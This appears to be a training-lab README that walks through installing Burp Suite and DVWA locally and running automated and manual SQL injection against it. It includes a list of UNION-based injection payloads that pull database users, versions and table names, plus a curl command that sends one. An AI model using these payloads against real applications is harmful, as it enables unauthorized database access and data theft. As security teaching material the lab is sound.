<div align="center">

# 💉 AI-Assisted SQL Injection via AInjection + Burp AI

### 🧠 Red Team Operations | Al Nafi Cybersecurity Training Platform

![BurpSuite](https://img.shields.io/badge/Burp%20Suite-Community%20Edition-FF6633?style=for-the-badge&logo=portswigger&logoColor=white)
![SQLInjection](https://img.shields.io/badge/SQL%20Injection-Web%20Exploitation-CC2927?style=for-the-badge&logo=mysql&logoColor=white)
![DVWA](https://img.shields.io/badge/DVWA-Vulnerable%20Target-4B8BBE?style=for-the-badge&logo=php&logoColor=white)
![Python](https://img.shields.io/badge/Python-3.x-3776AB?style=for-the-badge&logo=python&logoColor=white)

![Difficulty](https://img.shields.io/badge/Difficulty-Advanced-red?style=flat-square)
![Duration](https://img.shields.io/badge/Duration-2--3%20Hours-blue?style=flat-square)
![Category](https://img.shields.io/badge/Category-Web%20Application%20Security-orange?style=flat-square)
![Certification](https://img.shields.io/badge/Maps%20to-Red%20Team%20Operator%20Adversary%20Emulation-critical?style=flat-square)

</div>

---

## 📚 Table of Contents

- [🎯 Learning Objectives](#-learning-objectives)
- [✅ Prerequisites](#-prerequisites)
- [🖥️ Lab Environment](#️-lab-environment)
- [🚀 Task 1: Set up Burp Suite for Web Application Testing](#-task-1-set-up-burp-suite-for-web-application-testing)
- [🤖 Task 2: Integrate AInjection for Automated SQL Injection](#-task-2-integrate-ainjection-for-automated-sql-injection)
- [🧠 Task 3: Use Burp AI for Automated Vulnerability Exploitation](#-task-3-use-burp-ai-for-automated-vulnerability-exploitation)
- [🔬 Verification and Results](#-verification-and-results)
- [🗺️ MITRE ATT&CK Mapping](#️-mitre-attck-mapping)
- [🛠️ Troubleshooting](#️-troubleshooting)
- [📝 Key Takeaways](#-key-takeaways)
- [⚠️ Legal & Ethical Disclaimer](#️-legal--ethical-disclaimer)

---

## 🎯 Learning Objectives

| # | Objective |
|---|-----------|
| 1 | 🌐 Set up and configure Burp Suite Community Edition for web application testing |
| 2 | 🤖 Install and integrate AInjection for automated SQL injection detection |
| 3 | 🧠 Utilize Burp Suite's built-in AI capabilities for vulnerability exploitation |
| 4 | 💉 Execute automated SQL injection attacks against vulnerable web applications |
| 5 | 📊 Analyze and interpret AI-generated attack payloads and results |

## ✅ Prerequisites

| Requirement | Details |
|---|---|
| 💉 SQL Injection | Basic understanding of the vulnerability class |
| 💻 Linux CLI | Familiarity with command-line operations |
| 🌐 Web AppSec | Knowledge of web application security concepts |
| 📡 HTTP | Understanding of requests and responses |

---

## 🖥️ Lab Environment

> Al Nafi provides a **Linux-based cloud machine** for this lab. Click **Start Lab** to access your dedicated environment. The machine is provisioned bare metal with no pre-installed tools — you will install every component during the lab.

---

## 🚀 Task 1: Set up Burp Suite for Web Application Testing

![Step](https://img.shields.io/badge/Step-1.1-blue?style=flat-square) **Install Java and Burp Suite Community Edition**

```bash
# ☕ Update packages and install Java
sudo apt update && sudo apt upgrade -y
sudo apt install openjdk-11-jdk wget curl -y
java -version
```

Download and install Burp Suite Community Edition:

```bash
# ⬇️ TODO: Confirm the latest Burp Suite version at portswigger.net before downloading
cd /tmp
wget "https://portswigger.net/burp/releases/download?product=community&version=2023.10.3.4&type=Linux" -O burpsuite_community.sh
chmod +x burpsuite_community.sh
sudo ./burpsuite_community.sh
```

![Step](https://img.shields.io/badge/Step-1.2-blue?style=flat-square) **Configure Burp Suite Proxy**

```bash
# 🚀 Launch Burp Suite
burpsuite &
```

Configure proxy settings:

- Navigate to **Proxy > Options**
- Verify the proxy listener is running on `127.0.0.1:8080`
- Go to **Proxy > Intercept** and ensure intercept is off for now

![Step](https://img.shields.io/badge/Step-1.3-blue?style=flat-square) **Set up Vulnerable Web Application**

Install and configure DVWA (Damn Vulnerable Web Application) — an intentionally vulnerable app built for security training:

```bash
sudo apt install apache2 mysql-server php php-mysql php-gd libapache2-mod-php -y
sudo systemctl start apache2
sudo systemctl start mysql

cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chown -R www-data:www-data DVWA/
sudo chmod -R 755 DVWA/

# 🎯 TODO: Use a unique lab-only DB password rather than reusing 'password' outside this exercise
sudo mysql -e "CREATE DATABASE dvwa; CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost'; FLUSH PRIVILEGES;"

sudo cp DVWA/config/config.inc.php.dist DVWA/config/config.inc.php
sudo sed -i "s/\$_DVWA\['db_password'\] = 'p@ssw0rd';/\$_DVWA\['db_password'\] = 'password';/" DVWA/config/config.inc.php
```

Access DVWA setup:

```bash
firefox http://localhost/DVWA/setup.php &
```

> Click **Create / Reset Database** and log in with `admin` / `password`.

---

## 🤖 Task 2: Integrate AInjection for Automated SQL Injection

![Step](https://img.shields.io/badge/Step-2.1-purple?style=flat-square) **Install AInjection Tool**

```bash
sudo apt install python3 python3-pip git -y
pip3 install requests beautifulsoup4 urllib3

cd /opt
sudo git clone https://github.com/yhy0/AInjection.git
cd AInjection
sudo pip3 install -r requirements.txt
```

![Step](https://img.shields.io/badge/Step-2.2-purple?style=flat-square) **Configure AInjection with Burp Suite**

Create AInjection configuration file:

```json
cat > config.json << EOF
{
    "proxy": {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    },
    "target": "http://localhost/DVWA/vulnerabilities/sqli/",
    "cookies": "security=low; PHPSESSID=your_session_id"
}
EOF
```

Get the DVWA session cookie:

```bash
curl -c cookies.txt -d "username=admin&password=password&Login=Login" http://localhost/DVWA/login.php
cat cookies.txt | grep PHPSESSID
```

> 🎯 **TODO:** Update the `PHPSESSID` value in `config.json` with the actual session ID retrieved above.

![Step](https://img.shields.io/badge/Step-2.3-purple?style=flat-square) **Execute AInjection Scan**

```bash
# 🎯 TODO: Replace 'your_actual_session_id' with the PHPSESSID captured in Step 2.2
python3 aiinjection.py -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" -c "security=low; PHPSESSID=your_actual_session_id" --proxy http://127.0.0.1:8080
```

> Monitor **Burp Suite HTTP history** to observe automated requests as the scan runs.

---

## 🧠 Task 3: Use Burp AI for Automated Vulnerability Exploitation

![Step](https://img.shields.io/badge/Step-3.1-green?style=flat-square) **Enable Burp Suite Extensions**

In Burp Suite:

- Go to **Extender > BApp Store**
- Install the **SQLiPy** extension for enhanced SQL injection testing
- Install **Logger++** for detailed request logging

![Step](https://img.shields.io/badge/Step-3.2-green?style=flat-square) **Configure Automated Scanning**

Set up Burp Scanner:

- Navigate to **Scanner > Live scanning**
- Enable **Live audit from Proxy**
- Configure scan settings for SQL injection detection

![Step](https://img.shields.io/badge/Step-3.3-green?style=flat-square) **Execute AI-Enhanced Vulnerability Testing**

Browse DVWA through the Burp proxy:

```bash
export http_proxy=http://127.0.0.1:8080
export https_proxy=http://127.0.0.1:8080
firefox http://localhost/DVWA/vulnerabilities/sqli/ &
```

Perform manual testing while Burp AI analyzes:

1. Enter `1' OR '1'='1` in the ID field
2. Submit the form
3. Observe Burp's automated analysis in **Scanner > Results**

![Step](https://img.shields.io/badge/Step-3.4-green?style=flat-square) **Analyze AI-Generated Payloads**

Review Burp's findings:

- Check **Scanner > Results** for detected vulnerabilities
- Examine **Issue details** for AI-generated exploitation techniques
- Review **Request/Response** tabs for payload analysis

Create a custom payload list based on AI suggestions:

```bash
cat > ai_payloads.txt << EOF
1' UNION SELECT 1,2,3,4,5,6,7,8--
1' UNION SELECT null,user(),version(),database(),null,null,null,null--
1' UNION SELECT 1,table_name,null,null,null,null,null,null FROM information_schema.tables--
1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
1' OR 1=1#
EOF
```

![Step](https://img.shields.io/badge/Step-3.5-green?style=flat-square) **Automated Exploitation with Intruder**

Configure Burp Intruder:

1. Send the SQL injection request to **Intruder**
2. Set the payload position on the `id` parameter
3. Load `ai_payloads.txt` as the payload list
4. Execute the attack and analyze results

---

## 🔬 Verification and Results

Verify successful exploitation:

```bash
# 📄 Check if database information was extracted
grep -i "database\|version\|user" /tmp/burp_results.txt

# 🎯 TODO: Replace the PHPSESSID below with your current DVWA session cookie
curl -s "http://localhost/DVWA/vulnerabilities/sqli/?id=1' UNION SELECT 1,user(),version(),database(),5,6,7,8--&Submit=Submit" \
  -H "Cookie: security=low; PHPSESSID=your_session_id" | grep -i "mysql\|dvwa"
```

---

## 🗺️ MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1595.002 | Vulnerability Scanning | Reconnaissance |
| T1213 | Data from Information Repositories | Collection |
| T1552.001 | Credentials In Files | Credential Access |

**Related CWE:** CWE-89 (SQL Injection)

---

## 🛠️ Troubleshooting

<details>
<summary>🔴 Burp Suite won't start</summary>

- Confirm Java 11+ is installed and active: `java -version`
- Try launching from terminal to view startup errors: `burpsuite`
- Reinstall using the official `.sh` installer if the JAR is corrupted

</details>

<details>
<summary>🔴 DVWA database errors</summary>

- Reset database permissions and recreate the `dvwa` database and user
- Confirm `config.inc.php` matches the actual DB credentials
- Re-run **Create / Reset Database** from `setup.php`

</details>

<details>
<summary>🔴 AInjection connection errors</summary>

- Verify the proxy settings in `config.json` match Burp's listener (`127.0.0.1:8080`)
- Confirm the target URL is reachable directly via `curl`
- Check that the `PHPSESSID` cookie hasn't expired

</details>

<details>
<summary>🔴 Session timeout</summary>

- Log back into DVWA and refresh the `PHPSESSID` cookie
- Update the cookie value in both `config.json` and any manual `curl` commands
- Confirm DVWA security level is still set to **low** for this exercise

</details>

---

## 📝 Key Takeaways

| Concept | Summary |
|---|---|
| 🌐 Proxy-Based Testing | Routing traffic through Burp Suite enables full visibility into request/response cycles |
| 🤖 Automated Discovery | AInjection automates SQL injection probing beyond manual payload testing |
| 🧠 AI-Assisted Scanning | Burp's scanner and extensions surface exploitation paths with contextual analysis |
| 💉 Union-Based Injection | Crafted `UNION SELECT` payloads can extract database metadata from vulnerable endpoints |

---

## ⚠️ Legal & Ethical Disclaimer

> This lab is intended **solely for authorized educational use** within the Al Nafi cloud training environment. All techniques are demonstrated against **DVWA**, an application intentionally built to be vulnerable for security training. These techniques must only be used against systems you own or have **explicit written authorization** to test. Unauthorized SQL injection testing against third-party applications may violate computer misuse laws. Al Nafi and the lab authors assume no liability for misuse of this material.

---

<div align="center">

**Built with ❤️ for the next generation of cybersecurity professionals**

</div>
